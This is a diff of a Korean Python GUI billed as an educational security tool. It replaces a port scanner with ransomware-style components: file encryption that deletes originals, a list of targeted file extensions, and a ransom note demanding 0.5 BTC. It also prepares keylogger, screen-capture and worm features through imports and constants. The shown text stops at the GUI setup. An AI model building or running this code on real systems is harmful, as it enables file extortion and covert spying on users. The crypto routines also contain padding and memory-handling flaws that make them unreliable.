@@ -1,718 +1,1195 @@
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 import socket
-import os
 import threading
-from concurrent.futures import ThreadPoolExecutor
-import struct
+import os
+import sys
+import pathlib
+import time
+import base64
+import random
+import shutil
 
-# Cryptography 라이브러리 임포트
+# Pillow 라이브러리 
+try:
+    from PIL import ImageGrab
+except ImportError:
+    messagebox.showerror("라이브러리 오류", "Pillow 라이브러리가 필요합니다. 'pip install pillow'를 실행하세요.")
+    sys.exit(1)
+
+# pynput 라이브러리 
+try:
+    from pynput import keyboard
+except ImportError:
+    messagebox.showerror("라이브러리 오류", "pynput 라이브러리가 필요합니다. 'pip install pynput'을 실행하세요.")
+    sys.exit(1)
+
+
+# cryptography 라이브러리 
+from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
+from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives import hashes
-from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.padding import PKCS7 
 from cryptography.hazmat.backends import default_backend
-from cryptography.exceptions import InvalidTag
 
 # ==============================================================================
-# I. 핵심 함수 및 고정 경로 설정 
+# I. 핵심 상수 정의
 # ==============================================================================
 
-# --- 키 파일 저장 경로를 사용자가 지정한 폴더로 고정 ---
-FIXED_KEY_DIR = ""
-AES_KEY_PATH = os.path.join(FIXED_KEY_DIR, "aes_256.key")
-PRIVATE_KEY_PATH = os.path.join(FIXED_KEY_DIR, "private.pem")
-PUBLIC_KEY_PATH = os.path.join(FIXED_KEY_DIR, "public.pem")
-
-# 확장자 상수 정의
-AES_EXT = ".aes_enc" # 9글자
-HYB_EXT = ".hyb_enc" # 8글자
-
-# GUI 표시용 파일 이름
-AES_KEY_FILE = "aes_256.key"
-PRIVATE_KEY_FILE = "private.pem"
-PUBLIC_KEY_FILE = "public.pem"
-
-# 대용량 파일 스트리밍을 위한 청크 크기 (1MB)
+# 프로그램 시작 시 경로 설정이 안 되어 있을 경우의 기본 임시 경로
+DEFAULT_BASE_DIR = pathlib.Path.home() / "security_tool_keys"
+# 파일 처리 버퍼 크기 (1MB) - 대용량 파일 속도 개선을 위해 사용
 CHUNK_SIZE = 1024 * 1024 
 
+# 확장자 상수 정의
+AES_EXT = ".aes_enc" # AES 암호화 파일 확장자
+AES_KEY_EXT = ".aes_key" # AES 키 파일 확장자 
+HYB_EXT = ".hyb_enc" # RSA 하이브리드 암호화 파일 확장자 
+RANSOM_EXTS = ['.png', '.jpg', '.txt', '.hwp', '.mp4', '.mp3'] # 랜섬웨어 대상 확장자
 
-# --- A. 포트 스캐너 함수 ---
-def port_scan_worker(target_ip, port):
-    """단일 포트를 스캔하는 워커 함수"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # 스캔 속도를 위해 타임아웃을 짧게 설정
-        sock.settimeout(0.1)
-        result = sock.connect_ex((target_ip, port))
-        if result == 0:
-            sock.close(); return port
-        sock.close()
-    except Exception: pass
-    return None
+# 위협 요소 체험 상수 정의
+WORM_FILE_NAME = "virus_clone.log" # 웜 복제 대상 파일 이름
+SPY_LOG_NAME = "spy_key_log.txt"  # 스파이웨어/키로거 로그 파일 이름
+CAPTURE_NAME = "desktop_capture_" # 스파이웨어 캡처 파일 이름 접두사
 
-def run_port_scanner(target_ip, start_port, end_port, callback):
-    """주어진 범위의 포트를 멀티 스레드로 스캔"""
-    open_ports = []
-    callback(f"** 대상: {target_ip} 포트 스캔 시작 ({start_port}-{end_port}) **\n")
+# 랜섬노트 파일명 및 내용
+RANSOM_NOTE_NAME = "READ_ME_DECRYPT.txt"
+RANSOM_NOTE_CONTENT = """
+=====================================================
+당신의 파일은 암호화되었습니다!
+=====================================================
+
+당신의 모든 중요한 파일(사진, 문서, 영상 등)이 강력한 암호화 알고리즘으로 잠겨 있습니다.
+파일을 복구할 수 있는 유일한 방법은 개인 복호화 키를 구매하는 것입니다.
+
+[복호화 방법]
+1. 비트코인 0.5 BTC를 다음 주소로 송금하세요: (가상의 주소)
+2. 송금 후 48시간 내에 저희에게 연락하여 복호화 키를 받으세요.
+3. 이 경고 파일을 삭제하지 마십시오.
+
+키가 없으면 파일은 영원히 잠기게 됩니다!
+당신이 이 메시지를 읽는 동안 시간은 흐르고 있습니다.
+
+=====================================================
+""" 
+
+# ==============================================================================
+# II. 공통 암호화/복호화 도우미 함수 
+# ==============================================================================
+
+def generate_key_and_iv():
+    """AES 키 (32바이트)와 IV (16바이트)를 생성합니다."""
+    key = os.urandom(32) # AES-256 키
+    iv = os.urandom(16) # CBC 모드 초기화 벡터
+    return key, iv
+
+def load_private_key(key_dir):
+    """지정된 경로에서 개인키 파일을 로드합니다."""
+    key_path = pathlib.Path(key_dir) / "private.pem"
+    if not key_path.exists():
+        raise FileNotFoundError(f"개인키 파일(private.pem)을 경로 '{key_dir}'에서 찾을 수 없습니다.")
+    with open(key_path, "rb") as key_file:
+        private_key = serialization.load_pem_private_key(
+            key_file.read(),
+            password=None, # 암호가 없는 키를 가정
+            backend=default_backend()
+        )
+    return private_key
+
+def load_public_key(key_dir):
+    """지정된 경로에서 공개키 파일을 로드합니다."""
+    key_path = pathlib.Path(key_dir) / "public.pem"
+    if not key_path.exists():
+        raise FileNotFoundError(f"공개키 파일(public.pem)을 경로 '{key_dir}'에서 찾을 수 없습니다.")
+    with open(key_path, "rb") as key_file:
+        public_key = serialization.load_pem_public_key(
+            key_file.read(),
+            backend=default_backend()
+        )
+    return public_key
+
+# ==============================================================================
+# III. AES 암호화/복호화 함수 
+# ==============================================================================
+
+def aes_encrypt_file_chunked(filepath, key_base_dir, progress_callback):
+    """
+    파일을 AES 대칭키로 암호화하고, 키와 IV를 별도의 파일로 저장합니다.
+    """
+    filesize = os.path.getsize(filepath)
+    if filesize == 0:
+        raise ValueError("파일 크기가 0바이트입니다.")
+
+    key, iv = generate_key_and_iv() 
+
+    encrypted_filepath = filepath + AES_EXT
+    key_filename = f"{pathlib.Path(filepath).name}{AES_KEY_EXT}"
+    key_filepath = pathlib.Path(key_base_dir) / key_filename
+
+    # 1. 키 및 IV를 별도 파일로 저장
     try:
-        # 최대 50개의 스레드를 사용하여 병렬 스캔
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            futures = [executor.submit(port_scan_worker, target_ip, port) for port in range(start_port, end_port + 1)]
-            for future in futures:
-                port = future.result()
-                if port is not None:
-                    open_ports.append(port); callback(f"  [+] 포트 {port} 열림\n")
-        callback(f"\n** 스캔 완료. 총 {len(open_ports)}개 포트 열림: {sorted(open_ports)} **\n")
+        with open(key_filepath, 'wb') as keyfile:
+            keyfile.write(len(key).to_bytes(4, 'big')) 
+            keyfile.write(key)
+            keyfile.write(len(iv).to_bytes(4, 'big'))
+            keyfile.write(iv)
     except Exception as e:
-        callback(f"❌ 스캔 오류 발생: {e}\n")
+        raise IOError(f"키 파일 저장 실패: {e}")
 
-
-# --- B. AES-256 GCM (대칭키) 함수 ---
-def load_aes_key(): 
-    """저장된 AES 키를 로드"""
-    try: return open(AES_KEY_PATH, "rb").read()
-    except FileNotFoundError: return None
-
-def generate_aes_key():
-    """새로운 AES-256 (32바이트) 키 생성"""
-    return os.urandom(32)
-
-def encrypt_file_auto_delete_aes_gcm(filename, key, progress_callback): 
-    """AES-256 GCM으로 파일 암호화 및 원본 삭제"""
-    nonce = os.urandom(12) 
-    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
+    # 2. 파일 암호화
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
     encryptor = cipher.encryptor()
-
-    encrypted_filename = filename + AES_EXT 
+    padder = PKCS7(algorithms.AES.block_size).padder() 
     
-    file_size = os.path.getsize(filename)
     bytes_processed = 0
     
-    progress_callback(0, f"암호화 시작: {os.path.basename(filename)}")
-    
-    with open(filename, "rb") as infile, open(encrypted_filename, "wb") as outfile:
-        # 1. 헤더 기록: Nonce 길이 (4바이트), Nonce (12바이트)
-        outfile.write(struct.pack('<I', len(nonce))) 
-        outfile.write(nonce)
-        
-        # 2. 데이터 암호화 (청크 스트리밍)
+    with open(filepath, 'rb') as infile, open(encrypted_filepath, 'wb') as outfile:
         while True:
             chunk = infile.read(CHUNK_SIZE)
-            if not chunk: break
-            
-            outfile.write(encryptor.update(chunk))
-            
+            if not chunk:
+                break
+                
+            if len(chunk) < CHUNK_SIZE:
+                padded_data = padder.update(chunk) + padder.finalize()
+                encrypted_chunk = encryptor.update(padded_data) + encryptor.finalize()
+                outfile.write(encrypted_chunk)
+            else:
+                encrypted_chunk = encryptor.update(chunk)
+                outfile.write(encrypted_chunk)
+
             bytes_processed += len(chunk)
-            percent = min(100, int((bytes_processed / file_size) * 100)) if file_size > 0 else 100
-            progress_callback(percent, f"암호화 중... {percent}%")
+            progress = int((bytes_processed / filesize) * 100)
+            progress_callback(progress, f"AES 암호화 중 ({progress}%)")
 
-        # 3. 최종 처리 및 Tag 기록
-        outfile.write(encryptor.finalize())
-        tag = encryptor.tag
-        
-        # Tag 길이 (4바이트), Tag (16바이트) 기록
-        outfile.write(struct.pack('<I', len(tag))) 
-        outfile.write(tag)
-        
-    # 암호화 성공 시 원본 파일 삭제
-    os.remove(filename) 
-    progress_callback(100, "암호화 완료!")
-    return encrypted_filename 
+    progress_callback(100, f"AES 암호화 완료. 키 파일: {key_filepath.name}")
+    os.remove(filepath)
+    return key_filepath
 
-def decrypt_file_auto_delete_aes_gcm(encrypted_filename, key, progress_callback): 
+def aes_decrypt_file_chunked(encrypted_filepath, key_base_dir, progress_callback):
     """
-    AES-256 GCM 복호화.
-      성공 시에만 암호화 파일 삭제. 오류 발생 시 모든 파일 보존. 
+    암호화된 파일을 복호화합니다.
     """
-    # 원본 파일 이름 복원 (확장자 문자열 기반 제거)
-    if encrypted_filename.lower().endswith(AES_EXT):
-        original_filename = encrypted_filename[:-len(AES_EXT)] 
-    else:
-        original_filename = encrypted_filename 
-        
-    progress_callback(0, f"복호화 시작: {os.path.basename(encrypted_filename)}")
+    original_filename = pathlib.Path(encrypted_filepath).name.replace(AES_EXT, '')
+    key_filename = original_filename + AES_KEY_EXT
+    key_filepath = pathlib.Path(key_base_dir) / key_filename
     
+    if not key_filepath.exists():
+        raise FileNotFoundError(f"키 파일 '{key_filename}'을 '{key_base_dir}'에서 찾을 수 없습니다.")
+
+    # 1. 키 및 IV 로드
     try:
-        with open(encrypted_filename, "rb") as infile, open(original_filename, "wb") as outfile:
-            # 1. Nonce 읽기
-            nonce_len = struct.unpack('<I', infile.read(4))[0]
-            if nonce_len != 12: raise ValueError("Invalid Nonce Length")
-            nonce = infile.read(nonce_len)
+        with open(key_filepath, 'rb') as keyfile:
+            key_len_bytes = keyfile.read(4)
+            if len(key_len_bytes) < 4: raise ValueError("키 파일 손상: 키 길이 정보 누락")
+            key_len = int.from_bytes(key_len_bytes, 'big')
+            key = keyfile.read(key_len)
             
-            # 2. 파일 크기 계산 및 Tag 읽기 (파일 끝에서부터)
-            infile.seek(0, os.SEEK_END)
-            total_size = infile.tell()
+            iv_len_bytes = keyfile.read(4)
+            if len(iv_len_bytes) < 4: raise ValueError("키 파일 손상: IV 길이 정보 누락")
+            iv_len = int.from_bytes(iv_len_bytes, 'big')
+            iv = keyfile.read(iv_len)
             
-            infile.seek(total_size - 4 - 16)
-            
-            tag_len = struct.unpack('<I', infile.read(4))[0]
-            if tag_len != 16: raise ValueError("Invalid Tag Length")
-            tag = infile.read(tag_len)
-            
-            # 3. 데이터 시작점으로 돌아가기
-            data_start_pos = 4 + nonce_len
-            infile.seek(data_start_pos)
-
-            # 4. 복호화 객체 생성 및 데이터 크기 계산
-            cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
-            decryptor = cipher.decryptor()
-            encrypted_data_size = total_size - data_start_pos - 4 - tag_len
-            
-            # 5. 청크 단위 복호화 및 쓰기
-            bytes_read = 0
-            while bytes_read < encrypted_data_size:
-                chunk_to_read = min(CHUNK_SIZE, encrypted_data_size - bytes_read)
-                chunk = infile.read(chunk_to_read)
-                if not chunk: break
-                
-                outfile.write(decryptor.update(chunk))
-                
-                bytes_read += len(chunk)
-                percent = min(100, int((bytes_read / encrypted_data_size) * 100)) if encrypted_data_size > 0 else 100
-                progress_callback(percent, f"복호화 중... {percent}%")
-
-            # 6. 최종 복호화 (Tag 인증)
-            outfile.write(decryptor.finalize())
-            
-        # 복호화 및 인증이 성공했을 때만 암호화 파일을 삭제합니다. 
-        os.remove(encrypted_filename) 
-
-    except InvalidTag as e:
-        # 인증 오류 발생 시: 불완전한 원본 파일만 삭제하고 암호화 파일은 유지
-        if os.path.exists(original_filename): os.remove(original_filename) 
-        progress_callback(0, "복호화 실패 (인증 오류)")
-        raise e
     except Exception as e:
-        # 기타 오류 발생 시: 불완전한 원본 파일만 삭제하고 암호화 파일은 유지
-        if os.path.exists(original_filename): os.remove(original_filename) 
-        progress_callback(0, "복호화 실패 (오류 발생)")
-        raise e
-        
-    progress_callback(100, "복호화 완료!")
-    return original_filename
+        raise IOError(f"키 파일 로드 실패: {e}")
 
+    decrypted_filepath = encrypted_filepath.replace(AES_EXT, "")
+    filesize = os.path.getsize(encrypted_filepath)
+    
+    # 2. 파일 복호화
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    unpadder = PKCS7(algorithms.AES.block_size).unpadder()
 
-# --- C. RSA (비대칭키) 함수 ---
+    bytes_read = 0
+    all_decrypted_data = b'' # 최종 언패딩을 위해 복호화 데이터를 모으는 버퍼
 
-def generate_rsa_key_pair(): 
-    """RSA 키 쌍 (공개키/개인키) 생성 및 저장"""
-    os.makedirs(FIXED_KEY_DIR, exist_ok=True) 
-    # 개인키 생성 (2048비트)
-    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-    pem = private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption())
-    with open(PRIVATE_KEY_PATH, 'wb') as f: f.write(pem)
-    # 공개키 저장
-    public_key = private_key.public_key()
-    pem = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
-    with open(PUBLIC_KEY_PATH, 'wb') as f: f.write(pem)
-    return PUBLIC_KEY_FILE, PRIVATE_KEY_FILE
-
-def load_public_key(): 
-    """저장된 RSA 공개키 로드"""
-    with open(PUBLIC_KEY_PATH, "rb") as key_file: return serialization.load_pem_public_key(key_file.read())
-
-def load_private_key(): 
-    """저장된 RSA 개인키 로드"""
-    with open(PRIVATE_KEY_PATH, "rb") as key_file: return serialization.load_pem_private_key(key_file.read(), password=None)
-
-# AES-GCM 기반 하이브리드 암호화
-def hybrid_encrypt_file_auto_delete(filename, public_key, progress_callback): 
-    """RSA-AES 하이브리드 암호화 및 원본 삭제"""
-    aes_key = os.urandom(32) 
-    nonce = os.urandom(12) 
-    
-    # 1. AES 키를 RSA 공개키로 암호화 (OAEP 패딩 사용)
-    encrypted_aes_key = public_key.encrypt(
-        aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
-    
-    # 2. AES-GCM 암호화 설정
-    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce), backend=default_backend())
-    encryptor = cipher.encryptor()
-    
-    output_filename = filename + HYB_EXT
-    
-    file_size = os.path.getsize(filename)
-    bytes_processed = 0
-    
-    progress_callback(0, f"하이브리드 암호화 시작: {os.path.basename(filename)}")
-    
-    with open(filename, "rb") as infile, open(output_filename, "wb") as outfile:
-        # 3. 헤더 기록 (암호화된 AES 키)
-        outfile.write(struct.pack('<I', len(encrypted_aes_key))) 
-        outfile.write(encrypted_aes_key)
-        
-        # 4. 헤더 기록 (Nonce)
-        outfile.write(struct.pack('<I', len(nonce))) 
-        outfile.write(nonce)
-        
-        # 5. 데이터 암호화 (스트리밍)
+    with open(encrypted_filepath, 'rb') as infile:
         while True:
-            chunk = infile.read(CHUNK_SIZE)
-            if not chunk: break
+            chunk = infile.read(CHUNK_SIZE) 
             
-            outfile.write(encryptor.update(chunk))
-            
-            bytes_processed += len(chunk)
-            percent = min(100, int((bytes_processed / file_size) * 100)) if file_size > 0 else 100
-            progress_callback(percent, f"하이브리드 암호화 중... {percent}%")
-
-        # 6. 최종 암호화 및 Tag 생성 및 기록
-        outfile.write(encryptor.finalize())
-        tag = encryptor.tag
-        
-        outfile.write(struct.pack('<I', len(tag))) 
-        outfile.write(tag)
-        
-    os.remove(filename) # 암호화 성공 시 원본 삭제
-    progress_callback(100, "하이브리드 암호화 완료!")
-    return output_filename
-
-# AES-GCM 기반 하이브리드 복호화
-def hybrid_decrypt_file_auto_delete(encrypted_filename, private_key, progress_callback): 
-    """
-    RSA-AES 하이브리드 복호화.
-    성공 시에만 암호화 파일 삭제. 오류 발생 시 모든 파일 보존. 
-    """
-    # 원본 파일 이름 복원 (확장자 문자열 기반 제거)
-    if encrypted_filename.lower().endswith(HYB_EXT):
-        original_filename = encrypted_filename[:-len(HYB_EXT)] 
-    else:
-        original_filename = encrypted_filename
-
-    progress_callback(0, f"하이브리드 복호화 시작: {os.path.basename(encrypted_filename)}")
-
-    try:
-        with open(encrypted_filename, "rb") as infile, open(original_filename, "wb") as outfile:
-            # 1. 암호화된 AES 키 길이 읽기
-            encrypted_key_len = struct.unpack('<I', infile.read(4))[0]
-            encrypted_aes_key = infile.read(encrypted_key_len)
-            
-            # 2. 개인키로 AES 키 복호화
-            aes_key = private_key.decrypt(
-                encrypted_aes_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
-            
-            # 3. Nonce 읽기
-            nonce_len = struct.unpack('<I', infile.read(4))[0]
-            if nonce_len != 12: raise ValueError("Invalid Nonce Length")
-            nonce = infile.read(nonce_len)
-            
-            # 4. Tag 읽기 및 데이터 크기 계산 
-            header_size = 4 + encrypted_key_len + 4 + nonce_len
-            infile.seek(0, os.SEEK_END)
-            total_size = infile.tell()
-            
-            infile.seek(total_size - 4 - 16)
-            tag_len = struct.unpack('<I', infile.read(4))[0]
-            if tag_len != 16: raise ValueError("Invalid Tag Length")
-            tag = infile.read(tag_len)
-            
-            # 5. 데이터 시작점으로 돌아가기
-            infile.seek(header_size)
-
-            # 6. 복호화 객체 생성 및 암호화된 데이터 크기 계산
-            cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce, tag), backend=default_backend())
-            decryptor = cipher.decryptor()
-            encrypted_data_size = total_size - header_size - 4 - tag_len
-            
-            # 7. 청크 단위 복호화 및 쓰기
-            bytes_read = 0
-            while bytes_read < encrypted_data_size:
-                chunk_to_read = min(CHUNK_SIZE, encrypted_data_size - bytes_read)
-                chunk = infile.read(chunk_to_read)
-                if not chunk: break
+            if not chunk:
+                decrypted_padded_data = decryptor.finalize()
+                all_decrypted_data += decrypted_padded_data
+                break
                 
-                outfile.write(decryptor.update(chunk))
-                
-                bytes_read += len(chunk)
-                percent = min(100, int((bytes_read / encrypted_data_size) * 100)) if encrypted_data_size > 0 else 100
-                progress_callback(percent, f"하이브리드 복호화 중... {percent}%")
-
-            # 8. 최종 복호화 (Tag 인증)
-            outfile.write(decryptor.finalize())
+            decrypted_chunk = decryptor.update(chunk)
+            all_decrypted_data += decrypted_chunk
             
-        # 복호화 및 인증이 성공했을 때만 암호화 파일을 삭제합니다. 
-        os.remove(encrypted_filename)
+            bytes_read += len(chunk)
+            progress = int((bytes_read / filesize) * 100)
+            progress_callback(progress, f"AES 복호화 중 ({progress}%)")
 
-    except InvalidTag as e:
-        # 인증 오류 발생 시: 불완전한 원본 파일만 삭제하고 암호화 파일은 유지
-        if os.path.exists(original_filename): os.remove(original_filename)
-        progress_callback(0, "복호화 실패 (인증 오류)")
-        raise e
-    except Exception as e:
-        # 기타 오류 발생 시: 불완전한 원본 파일만 삭제하고 암호화 파일은 유지
-        if os.path.exists(original_filename): os.remove(original_filename)
-        progress_callback(0, "복호화 실패 (오류 발생)")
-        raise e
+    # 최종 언패딩 적용
+    decrypted_data = unpadder.update(all_decrypted_data) + unpadder.finalize()
+    
+    with open(decrypted_filepath, 'wb') as outfile:
+         outfile.write(decrypted_data)
         
-    progress_callback(100, "복호화 완료!")
-    return original_filename
+    os.remove(encrypted_filepath) 
+    progress_callback(100, "AES 복호화 완료 및 암호화 파일 삭제")
 
 
 # ==============================================================================
-# II. GUI 클래스 
+# IV. 하이브리드 암호화 함수 
+# ==============================================================================
+
+def hybrid_encrypt_file_chunked(filepath, public_key, progress_callback):
+    """
+    **[유지]** 파일을 AES 대칭키로 암호화하고, AES 키를 RSA 공개키로 암호화하여 저장합니다. 
+    **블록 단위**로 읽고 처리하여 대용량 파일을 지원합니다.
+    """
+    
+    filesize = os.path.getsize(filepath)
+    if filesize == 0:
+        raise ValueError("파일 크기가 0바이트입니다.")
+
+    key, iv = generate_key_and_iv()
+    
+    # RSA로 AES 키 및 IV 암호화 (OAEP 패딩 사용)
+    encrypted_key = public_key.encrypt(
+        key,
+        rsa_padding.OAEP( 
+            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    encrypted_iv = public_key.encrypt(
+        iv,
+        rsa_padding.OAEP( 
+            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+
+    encrypted_filepath = filepath + HYB_EXT
+    
+    # Cipher 객체와 패딩 객체 생성
+    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    padder = PKCS7(algorithms.AES.block_size).padder()
+    
+    bytes_processed = 0
+    
+    with open(filepath, 'rb') as infile, open(encrypted_filepath, 'wb') as outfile:
+        # A. 키 정보 길이 및 실제 키 정보 쓰기 (헤더)
+        outfile.write(len(encrypted_key).to_bytes(4, 'big'))
+        outfile.write(encrypted_key)
+        outfile.write(len(encrypted_iv).to_bytes(4, 'big'))
+        outfile.write(encrypted_iv)
+
+        # B. 파일 내용을 블록 단위로 읽고 암호화
+        while True:
+            chunk = infile.read(CHUNK_SIZE)
+            if not chunk:
+                break
+                
+            if len(chunk) < CHUNK_SIZE:
+                # 마지막 청크에 패딩 적용 후 암호화
+                padded_data = padder.update(chunk) + padder.finalize()
+                encrypted_chunk = encryptor.update(padded_data) + encryptor.finalize()
+                outfile.write(encrypted_chunk)
+            else:
+                # 중간 청크는 바로 암호화
+                encrypted_chunk = encryptor.update(chunk)
+                outfile.write(encrypted_chunk)
+
+            bytes_processed += len(chunk)
+            progress = int((bytes_processed / filesize) * 100)
+            progress_callback(progress, f"암호화 중 ({progress}%)")
+
+    # 4. 원본 파일 삭제 (랜섬웨어 특성)
+    os.remove(filepath)
+    progress_callback(100, "암호화 완료 및 원본 삭제")
+
+
+def hybrid_decrypt_file_chunked(encrypted_filepath, private_key, progress_callback):
+    """
+    [수정] 복호화 로직을 수정하여 대용량 파일의 언패딩 오류를 해결
+    """
+    
+    filesize = os.path.getsize(encrypted_filepath)
+    if filesize == 0:
+        raise ValueError("암호화된 파일 크기가 0바이트입니다.")
+        
+    decrypted_filepath = encrypted_filepath.replace(HYB_EXT, "")
+    
+    try:
+        with open(encrypted_filepath, 'rb') as infile:
+            
+            # A. 암호화된 AES 키/IV 길이 및 실제 키 읽기 (헤더)
+            enc_key_len_bytes = infile.read(4)
+            if len(enc_key_len_bytes) < 4: raise ValueError("파일 헤더 손상: 암호화 키 길이 정보 누락")
+            enc_key_len = int.from_bytes(enc_key_len_bytes, 'big')
+            encrypted_key = infile.read(enc_key_len)
+            
+            enc_iv_len_bytes = infile.read(4)
+            if len(enc_iv_len_bytes) < 4: raise ValueError("파일 헤더 손상: 암호화 IV 길이 정보 누락")
+            enc_iv_len = int.from_bytes(enc_iv_len_bytes, 'big')
+            encrypted_iv = infile.read(enc_iv_len)
+            
+            # B. RSA로 AES 키 및 IV 복호화 (OAEP 패딩 사용)
+            key = private_key.decrypt(
+                encrypted_key,
+                rsa_padding.OAEP( 
+                    mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
+                    label=None
+                )
+            )
+            iv = private_key.decrypt(
+                encrypted_iv,
+                rsa_padding.OAEP( 
+                    mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
+                    algorithm=hashes.SHA256(),
+                    label=None
+                )
+            )
+            
+            # Cipher 객체와 언패딩 객체 생성
+            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+            decryptor = cipher.decryptor()
+            unpadder = PKCS7(algorithms.AES.block_size).unpadder()
+
+            # C. 파일 내용 복호화 (언패딩을 위해 모든 데이터를 모음)
+            all_decrypted_data = b''
+            header_size = infile.tell()
+            
+            while True:
+                chunk = infile.read(CHUNK_SIZE) 
+                
+                if not chunk:
+                    decrypted_padded_data = decryptor.finalize()
+                    all_decrypted_data += decrypted_padded_data
+                    break
+                    
+                decrypted_chunk = decryptor.update(chunk)
+                all_decrypted_data += decrypted_chunk
+                
+                bytes_read = infile.tell() - header_size
+                encrypted_content_size = filesize - header_size
+                progress = int((bytes_read / encrypted_content_size) * 100)
+                progress_callback(progress, f"복호화 중 ({progress}%)")
+
+        # D. 복호화된 전체 데이터에 대해 최종적으로 언패딩을 적용합니다.
+        decrypted_data = unpadder.update(all_decrypted_data) + unpadder.finalize()
+        
+        with open(decrypted_filepath, 'wb') as outfile:
+             outfile.write(decrypted_data)
+        
+        # E. 암호화 파일 삭제
+        os.remove(encrypted_filepath)
+        progress_callback(100, "복호화 완료 및 암호화 파일 삭제")
+
+    except Exception as e:
+        progress_callback(0, f"⚠️ 복호화 오류 발생: {e}")
+        raise e
+
+
+# ==============================================================================
+# V. GUI 클래스 및 실행 코드 
 # ==============================================================================
 
 class SecurityToolGUI:
+    
+    # 키 로깅 상태를 제어하기 위한 변수
+    is_key_logging = False 
+    # 키보드 리스너 객체 (정지/시작 제어용)
+    key_listener = None 
+    
     def __init__(self, master):
         self.master = master
-        master.title("🛡️ 교육용 파이썬 보안 도구(V2.0)")
+        master.title("🛡️ 파이썬 통합 보안 도구 (교육용)")
         
-        # --- 1. 전역 스타일 설정 ---
-        style = ttk.Style(master)
+        # --- 핵심 경로 변수 초기화 ---
+        self.key_base_dir = DEFAULT_BASE_DIR # RSA 키 저장 기본 경로
+        self.aes_key_base_dir = DEFAULT_BASE_DIR / "AES_Keys" # AES 키 저장 기본 경로
         
-        DEFAULT_FONT = ('Malgun Gothic', 10)
-        
-        style.configure('.', font=DEFAULT_FONT)
-        style.configure('TNotebook.Tab', font=('Malgun Gothic', 10, 'bold'))
-        style.configure('TLabel', foreground='#333333') 
-        
-        # 버튼 스타일
-        style.configure('Encrypt.TButton', background='#B0BEC5', foreground='black', font=('Malgun Gothic', 10, 'bold'), padding=8)
-        style.map('Encrypt.TButton', background=[('active', '#DEDEDE')]) 
-        style.configure('Decrypt.TButton', background='#90A4AE', foreground='black', font=('Malgun Gothic', 10, 'bold'), padding=8)
-        style.map('Decrypt.TButton', background=[('active', '#BEC5CB')]) 
+        # 스타일 설정
+        style = ttk.Style()
+        style.configure('Encrypt.TButton', background='#1976D2', foreground='black', font=('Malgun Gothic', 10, 'bold'))
+        style.configure('Decrypt.TButton', background='#D32F2F', foreground='black', font=('Malgun Gothic', 10, 'bold'))
+        style.configure('Scan.TButton', background='#388E3C', foreground='black', font=('Malgun Gothic', 10, 'bold'))
 
-        # 키 생성 버튼 스타일
-        style.configure('Key.TButton', foreground='#1E88E5', padding=5)
-        
         # 탭 노트북 생성
         self.notebook = ttk.Notebook(master)
         
+        # 탭 추가
         self.create_port_scanner_tab()
         self.create_aes_tab() 
         self.create_rsa_tab()
+        self.create_ransomware_tab()
+        self.create_threat_tab() 
         self.create_developer_tab() 
         
         self.notebook.pack(expand=1, fill="both", padx=15, pady=15)
         
-    # 백그라운드 스레드에서 GUI 업데이트를 안전하게 처리
-    def update_progress(self, progress_var, label_var, percent, status_text):
-        """진행률 및 상태 텍스트를 안전하게 업데이트"""
-        progress_var.set(percent)
-        label_var.set(status_text)
-        self.master.update_idletasks() # GUI 강제 업데이트
-
-    # --- 1. 포트 스캐너 탭 ---
-    def create_port_scanner_tab(self):
-        port_frame = ttk.Frame(self.notebook, padding="15") 
-        self.notebook.add(port_frame, text="🌐 포트 스캐너")
-        
-        port_frame.columnconfigure(1, weight=1) 
-        
-        ttk.Label(port_frame, text="대상 IP 주소:").grid(row=0, column=0, pady=7, padx=(0, 10), sticky='w')
-        self.ip_entry = ttk.Entry(port_frame, width=35); self.ip_entry.grid(row=0, column=1, pady=7, padx=5, sticky='ew'); self.ip_entry.insert(0, "127.0.0.1")
-        
-        ttk.Label(port_frame, text="포트 범위 (시작-끝):").grid(row=1, column=0, pady=7, padx=(0, 10), sticky='w')
-        port_range_frame = ttk.Frame(port_frame) 
-        port_range_frame.grid(row=1, column=1, sticky='w')
-        self.port_start_entry = ttk.Entry(port_range_frame, width=10); self.port_start_entry.pack(side='left', padx=(5, 5)); self.port_start_entry.insert(0, "1")
-        ttk.Label(port_range_frame, text="-").pack(side='left')
-        self.port_end_entry = ttk.Entry(port_range_frame, width=10); self.port_end_entry.pack(side='left', padx=(5, 5)); self.port_end_entry.insert(0, "1024")
-        
